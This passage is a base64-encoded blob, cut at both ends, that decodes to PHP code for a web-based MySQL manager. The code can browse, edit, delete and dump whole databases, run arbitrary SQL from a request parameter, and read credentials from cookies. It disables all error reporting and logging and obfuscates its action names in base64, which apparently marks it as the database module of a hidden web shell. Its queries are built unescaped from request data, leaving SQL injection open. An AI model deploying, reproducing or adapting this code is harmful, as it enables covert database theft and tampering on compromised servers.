R5cGU9dGV4dCBzaXplPTQgbmFtZT1wYWdlPlxuIjsNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdHbyc+XG4iOw0KCX0NCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjwvZm9udD5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZURhdGEoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBEYXRhPC9oMT5cbiI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKSB7DQoJCWVjaG8gIjxoMT5FZGl0IERhdGE8L2gxPlxuIjsNCgkJJHBSZXN1bHQgPSBteXNxbF9saXN0X2ZpZWxkcyggJGRibmFtZSwgJHRhYmxlbmFtZSApOw0KCQkkbnVtID0gbXlzcWxfbnVtX2ZpZWxkcyggJHBSZXN1bHQgKTsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRpID0gMDsgJGkgPCAkbnVtOyAkaSsrICkgew0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkNCgkJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSIgLiAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIiBBTkQgIjsNCgkJCQllbHNlDQoJCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0nIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJyBBTkQgIjsNCgkJfQ0KCQkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCQlteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCQkkcFJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgPSAgIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBXSEVSRSAka2V5IiwgJG15c3FsSGFuZGxlICk7DQoJCSRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJfQ0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRicgbWV0aG9kPXBvc3Q+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWFkZERhdGFfc3VibWl0PlxuIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1lZGl0RGF0YV9zdWJtaXQ+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10YWJsZW5hbWUgdmFsdWU9JHRhYmxlbmFtZT5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9Mj5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+TmFtZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5UeXBlPC90aD5cbiI7DQoJZWNobyAiPHRoPkZ1bmN0aW9uPC90aD5cbiI7DQoJZWNobyAiPHRoPkRhdGE8L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCgkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBSZXN1bHQgKTsNCgkkcFJlc3VsdExlbiA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJCSRmaWVsZG5hbWUgPSAkZmllbGRbIkZpZWxkIl07DQoJCSRmaWVsZHR5cGUgPSAkZmllbGRbIlR5cGUiXTsNCgkJJGxlbiA9IG15c3FsX2ZpZWxkX2xlbiggJHBSZXN1bHRMZW4sICRpICk7DQoJCWVjaG8gIjx0cj4iOw0KCQllY2hvICI8dGQ+JGZpZWxkbmFtZTwvdGQ+IjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJUeXBlIl0uIjwvdGQ+IjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiPHNlbGVjdCBuYW1lPSR7ZmllbGRuYW1lfV9mdW5jdGlvbj5cbiI7DQoJCWVjaG8gIjxvcHRpb24+XG4iOw0KCQllY2hvICI8b3B0aW9uPkFTQ0lJXG4iOw0KCQllY2hvICI8b3B0aW9uPkNIQVJcbiI7DQoJCWVjaG8gIjxvcHRpb24+U09VTkRFWFxuIjsNCgkJZWNobyAiPG9wdGlvbj5DVVJEQVRFXG4iOw0KCQllY2hvICI8b3B0aW9uPkNVUlRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+RlJPTV9EQVlTXG4iOw0KCQllY2hvICI8b3B0aW9uPkZST01fVU5JWFRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+Tk9XXG4iOw0KCQllY2hvICI8b3B0aW9uPlBBU1NXT1JEXG4iOw0KCQllY2hvICI8b3B0aW9uPlBFUklPRF9BRERcbiI7DQoJCWVjaG8gIjxvcHRpb24+UEVSSU9EX0RJRkZcbiI7DQoJCWVjaG8gIjxvcHRpb24+VE9fREFZU1xuIjsNCgkJZWNobyAiPG9wdGlvbj5VU0VSXG4iOw0KCQllY2hvICI8b3B0aW9uPldFRUtEQVlcbiI7DQoJCWVjaG8gIjxvcHRpb24+UkFORFxuIjsNCgkJZWNobyAiPC9zZWxlY3Q+XG4iOw0KCQllY2hvICI8L3RkPlxuIjsNCgkJJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkZGF0YVskaV0pOw0KCQlpZiggJGNtZCA9PSAiYWRkIiApIHsNCgkJCSR0eXBlID0gc3RydG9rKCAkZmllbGR0eXBlLCAiICgsKVxuIiApOw0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8fCAkdHlwZSA9PSAic2V0IiApIHsNCgkJCQllY2hvICI8dGQ+XG4iOw0KCQkJCWlmKCAkdHlwZSA9PSAiZW51bSIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZT5cbiI7DQoJCQkJZWxzZSBpZiggJHR5cGUgPT0gInNldCIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZSBzaXplPTQgbXVsdGlwbGU+XG4iOw0KCQkJCXdoaWxlKCAkc3RyID0gc3RydG9rKCAiJyIgKSApIHsNCgkJCQkJZWNobyAiPG9wdGlvbj4kc3RyXG4iOw0KCQkJCQlzdHJ0b2soICInIiApOw0KCQkJCX0NCgkJCQllY2hvICI8L3NlbGVjdD5cbiI7DQoJCQkJZWNobyAiPC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWlmKCAkbGVuIDwgNDAgKQ0KCQkJCQllY2hvICI8dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTQwIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT48L3RkPlxuIjsNCgkJCQllbHNlDQoJCQkJCWVjaG8gIjx0ZD48dGV4dGFyZWEgY29scz00MCByb3dzPTMgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lPjwvdGV4dGFyZWE+XG4iOw0KCQkJfQ0KCQl9IGVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCQlpZiggJHR5cGUgPT0gImVudW0iIHx8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCWVjaG8gIjx0ZD5cbiI7DQoJCQkJaWYoICR0eXBlID09ICJlbnVtIiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lPlxuIjsNCgkJCQllbHNlIGlmKCAkdHlwZSA9PSAic2V0IiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lIHNpemU9NCBtdWx0aXBsZT5cbiI7DQoJCQkJd2hpbGUoICRzdHIgPSBzdHJ0b2soICInIiApICkgew0KCQkJCQlpZiggJHZhbHVlID09ICRzdHIgKQ0KCQkJCQkJZWNobyAiPG9wdGlvbiBzZWxlY3RlZD4kc3RyXG4iOw0KCQkJCQllbHNlDQoJCQkJCQllY2hvICI8b3B0aW9uPiRzdHJcbiI7DQoJCQkJCXN0cnRvayggIiciICk7DQoJCQkJfQ0KCQkJCWVjaG8gIjwvc2VsZWN0PlxuIjsNCgkJCQllY2hvICI8L3RkPlxuIjsNCgkJCX0gZWxzZSB7DQoJCQkJaWYoICRsZW4gPCA0MCApDQoJCQkJCWVjaG8gIjx0ZD48aW5wdXQgdHlwZT10ZXh0IHNpemU9NDAgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lIHZhbHVlPVwiJHZhbHVlXCI+PC90ZD5cbiI7DQoJCQkJZWxzZQ0KCQkJCQllY2hvICI8dGQ+PHRleHRhcmVhIGNvbHM9NDAgcm93cz0zIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT4kdmFsdWU8L3RleHRhcmVhPlxuIjsNCgkJCX0NCgkJfQ0KCQllY2hvICI8L3RyPiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdBZGQgRGF0YSc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IERhdGEnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0NhbmNlbCcgb25DbGljaz0naGlzdG9yeS5iYWNrKCknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KfQ0KDQpmdW5jdGlvbiBtYW5hZ2VEYXRhX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCSRxdWVyeVN0ciA9ICJJTlNFUlQgSU5UTyAkdGFibGVuYW1lIFZBTFVFUyAoIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCSRxdWVyeVN0ciA9ICJSRVBMQUNFIElOVE8gJHRhYmxlbmFtZSBWQUxVRVMgKCI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bS0xOyAkaSsrICkgew0KCQkkZmllbGQgPSBteXNxbF9mZXRjaF9maWVsZCggJHBSZXN1bHQgKTsNCgkJJGZ1bmMgPSAkR0xPQkFMU1skZmllbGQtPm5hbWUuIl9mdW5jdGlvbiJdOw0KCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJJHF1ZXJ5U3RyIC49ICIgJGZ1bmMoIjsNCgkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkgew0KCQkJJHF1ZXJ5U3RyIC49ICRHTE9CQUxTWyRmaWVsZC0+bmFtZV07DQoJCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJCSRxdWVyeVN0ciAuPSAiKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiLCI7DQoJCX0gZWxzZSB7DQoJCQkkcXVlcnlTdHIgLj0gIiciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXTsNCgkJCWlmKCAkZnVuYyAhPSAiIiApDQoJCQkJJHF1ZXJ5U3RyIC49ICInKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiJywiOw0KCQl9DQoJfQ0KCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCApOw0KCWlmKCAkZmllbGQtPm51bWVyaWMgPT0gMSApDQoJCSRxdWVyeVN0ciAuPSAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIikiOw0KCWVsc2UNCgkJJHF1ZXJ5U3RyIC49ICInIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJykiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCgl2aWV3RGF0YSggIiIgKTsNCn0NCg0KZnVuY3Rpb24gZGVsZXRlRGF0YSgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJJGtleSA9ICIiOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQlpZiggJGZpZWxkLT5udW1lcmljID09IDEgKQ0KCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0iIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICIgQU5EICI7DQoJCQllbHNlDQoJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICInIEFORCAiOw0KCX0NCgkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5U3RyID0gICJERUxFVEUgRlJPTSAkdGFibGVuYW1lIFdIRVJFICRrZXkiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCXZpZXdEYXRhKCAiIiApOw0KfQ0KDQpmdW5jdGlvbiBmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGUpDQp7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwkZGJuYW1lOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5X2lkID0gbXlzcWxfcXVlcnkoIlNIT1cgQ1JFQVRFIFRBQkxFICR0YWJsZSIsJG15c3FsSGFuZGxlKTsNCgkkdGFibGVkdW1wID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5X2lkLCBNWVNRTF9BU1NPQyk7DQoJJHRhYmxlZHVtcCA9ICJEUk9QIFRBQkxFIElGIEVYSVNUUyAkdGFibGU7XG4iIC4gJHRhYmxlZHVtcFsnQ3JlYXRlIFRhYmxlJ10gLiAiO1xuXG4iOw0KCWVjaG8gJHRhYmxlZHVtcDsNCgkvLyBnZXQgZGF0YQ0KCSRyb3dzID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIEZST00gJHRhYmxlIiwkbXlzcWxIYW5kbGUpOw0KCSRudW1maWVsZHM9bXlzcWxfbnVtX2ZpZWxkcygkcm93cyk7DQoJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcm93cywgTVlTUUxfTlVNKSkNCgl7DQoJCSR0YWJsZWR1bXAgPSAiSU5TRVJUIElOVE8gJHRhYmxlIFZBTFVFUygiOw0KCQkkZmllbGRjb3VudGVyID0gLTE7DQoJCSRmaXJzdGZpZWxkID0gMTsNCgkJLy8gZ2V0IGVhY2ggZmllbGQncyBkYXRhDQoJCXdoaWxlICgrKyRmaWVsZGNvdW50ZXIgPCAkbnVtZmllbGRzKQ0KCQl7DQoJCQlpZiAoISRmaXJzdGZpZWxkKQ0KCQkJew0KCQkJCSR0YWJsZWR1bXAgLj0gJywgJzsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkZmlyc3RmaWVsZCA9IDA7DQoJCQl9DQoJCQlpZiAoIWlzc2V0KCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkpDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAnTlVMTCc7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAiJyIgLiBteXNxbF9lc2NhcGVfc3RyaW5nKCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkgLiAiJyI7DQoJCQl9DQoJCX0NCgkJJHRhYmxlZHVtcCAuPSAiKTtcbiI7DQoJCWVjaG8gJHRhYmxlZHVtcDsNCgl9DQoJQG15c3FsX2ZyZWVfcmVzdWx0KCRyb3dzKTsNCn0NCg0KZnVuY3Rpb24gZHVtcCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkYWN0aW9uLCAkZGJuYW1lLCAkdGFibGVuYW1lOw0KCWlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiICl7DQoJCWhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogZmlsZW5hbWU9JHRhYmxlbmFtZS5zcWwiKTsNCgkJaGVhZGVyKCdDb250ZW50LXR5cGU6IHVua25vd24vdW5rbm93bicpOw0KCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGVuYW1lKTsNCgkJZWNobyAiXG5cblxuIjsNCgkJZWNobyAiXHJcblxyXG5cclxuIyMjICR0YWJsZW5hbWUgVEFCTEUgRFVNUCBDT01QTEVURUQgIyMjIjsNCgkJZXhpdDsNCgl9ZWxzZXsNCgkJaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBmaWxlbmFtZT0kZGJuYW1lLnNxbCIpOw0KCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogdW5rbm93bi91bmtub3duJyk7DQoJCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJCSRxdWVyeV9pZCA9IG15c3FsX3F1ZXJ5KCJTSE9XIHRhYmxlcyIsJG15c3FsSGFuZGxlKTsNCgkJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnlfaWQsIE1ZU1FMX05VTSkpDQoJCXsNCgkJCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkcm93WzBdKTsNCgkJCQllY2hvICJcblxuXG4iOw0KCQkJCWVjaG8gIlxyXG5cclxuXHJcbiMjIyAkcm93WzBdIFRBQkxFIERVTVAgQ09NUExFVEVEICMjIyI7DQoJCQkJZWNobyAiXG5cblxuIjsNCgkJfQ0KCQllY2hvICJcclxuXHJcblxyXG4jIyMgJGRibmFtZSBEQVRBQkFTRSBEVU1QIENPTVBMRVRFRCAjIyMiOw0KCQlleGl0Ow0KCX0NCn0NCg0KZnVuY3Rpb24gdXRpbHMoKSB7DQoJZ2xvYmFsICRQSFBfU0VMRiwgJGNvbW1hbmQ7DQoJZWNobyAiPGgxPlV0aWxpdGllczwvaDE+XG4iOw0KCWlmKCAkY29tbWFuZCA9PSAiIiB8fCBzdWJzdHIoICRjb21tYW5kLCAwLCA1ICkgPT0gImZsdXNoIiApIHsNCgkJZWNobyAiPGhyPlxuIjsNCgkJZWNobyAiU2hvd1xuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3ZhcmlhYmxlcyc+VmFyaWFibGVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3Byb2Nlc3NsaXN0Jz5Qcm9jZXNzbGlzdDwvYT5cbiI7DQoJCWVjaG8gIjwvdWw+XG4iOw0KCQllY2hvICJGbHVzaFxuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9ob3N0cyc+SG9zdHM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX2hvc3RzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGhvc3RzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9sb2dzJz5Mb2dzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9sb2dzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGxvZ3MiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3ByaXZpbGVnZXMnPlByaXZpbGVnZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3ByaXZpbGVnZXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggcHJpdmlsZWdlcyIgKSAhPSBmYWxzZSApDQoJCQkJZWNobyAiLSBTdWNjZXNzIjsNCgkJCWVsc2UNCgkJCQllY2hvICItIEZhaWwiOw0KCQl9DQoJCWVjaG8gIjxsaT48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXV0aWxzJmNvbW1hbmQ9Zmx1c2hfdGFibGVzJz5UYWJsZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3RhYmxlcyIgKSB7DQoJCQlpZiggbXlzcWxfcXVlcnkoICJGbHVzaCB0YWJsZXMiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9zdGF0dXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggc3RhdHVzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPC91bD5cbiI7DQoJfSBlbHNlIHsNCgkJJHF1ZXJ5U3RyID0gZXJlZ19yZXBsYWNlKCAiXyIsICIgIiwgJGNvbW1hbmQgKTsNCgkJJHBSZXN1bHQgPSBteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICk7DQoJCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJCWVjaG8gIkZhaWwiOw0KCQkJcmV0dXJuOw0KCQl9DQoJCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCQllY2hvICI8cCBjbGFzcz1sb2NhdGlvbj4kcXVlcnlTdHI8L3A+XG4iOw0KCQllY2hvICI8aHI+XG4iOw0KCQllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yIGJvcmRlcj0wPlxuIjsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJCWVjaG8gIjx0aD4iLiRmaWVsZC0+bmFtZS4iPC90aD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJCXdoaWxlKCAxICkgew0KCQkJJHJvd0FycmF5ID0gbXlzcWxfZmV0Y2hfcm93KCAkcFJlc3VsdCApOw0KCQkJaWYoICRyb3dBcnJheSA9PSBmYWxzZSApIGJyZWFrOw0KCQkJZWNobyAiPHRyPlxuIjsNCgkJCWZvciggJGogPSAwOyAkaiA8ICRjb2w7ICRqKysgKQ0KCQkJCWVjaG8gIjx0ZD4iLmh0bWxzcGVjaWFsY2hhcnMoICRyb3dBcnJheVskal0gKS4iPC90ZD5cbiI7DQoJCQllY2hvICI8L3RyPlxuIjsNCgkJfQ0KCQllY2hvICI8L3RhYmxlPlxuIjsNCgl9DQp9DQpmdW5jdGlvbiBmb290ZXJfaHRtbCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkUEhQX1NFTEYsICRVU0VSTkFNRTsNCgllY2hvICI8aHI+XG4iOw0KCWVjaG8gIjxzcGFuIGNsYXNzPVwibmV3XCI+WyRVU0VSTkFNRV08L3NwYW4+IC0gXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249YkdsemRFUkNjdz09Jz5EYXRhYmFzZSBMaXN0PC9hPiB8IFxuIjsNCglpZiggJHRhYmxlbmFtZSAhPSAiIiApDQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bGlzdFRhYmxlcyZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+VGFibGUgTGlzdDwvYT4gfCAiOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMnPlV0aWxzPC9hPiB8XG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bG9nb3V0Jz5Mb2dvdXQ8L2E+XG4iOw0KfQ0KLy8tLS0tLS0tLS0tLS0tIE1BSU4gLS0tLS0tLS0tLS0tLSAvLw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KaW5pX3NldCAoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQppbmlfc2V0ICgnbG9nX2Vycm9ycycsIDApOw0KaWYoICRhY3Rpb24gPT0gImxvZ29uIiB8fCAkYWN0aW9uID09ICIiIHx8ICRhY3Rpb24gPT0gImxvZ291dCIgKQ0KCWxvZ29uKCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJiRzluYjI1ZmMzVmliV2wwIiApDQoJbG9nb25fc3VibWl0KCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiIHx8ICRhY3Rpb24gPT0gImR1bXBEQiIgKSB7DQoJd2hpbGUoIGxpc3QoJHZhciwgJHZhbHVlKSA9IGVhY2goJEhUVFBfQ09PS0lFX1ZBUlMpICkgew0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApICRVU0VSTkFNRSA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKSAkUEFTU1dPUkQgPSAkdmFsdWU7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICkgJEhPU1ROQU1FID0gJHZhbHVlOw0KCX0NCgkkbXlzcWxIYW5kbGUgPSBAbXlzcWxfY29ubmVjdCggJEhPU1ROQU1FLiI6MzMwNiIsICRVU0VSTkFNRSwgJFBBU1NXT1JEICk7DQoJZHVtcCgpOw0KfSBlbHNlIHsNCgl3aG